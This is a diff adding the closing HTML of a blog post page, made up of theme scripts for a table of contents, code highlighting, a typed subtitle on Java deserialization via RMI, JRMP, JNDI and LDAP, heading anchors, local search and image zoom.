+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Java反序列化中的RMI、JRMP、JNDI、LDAP&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
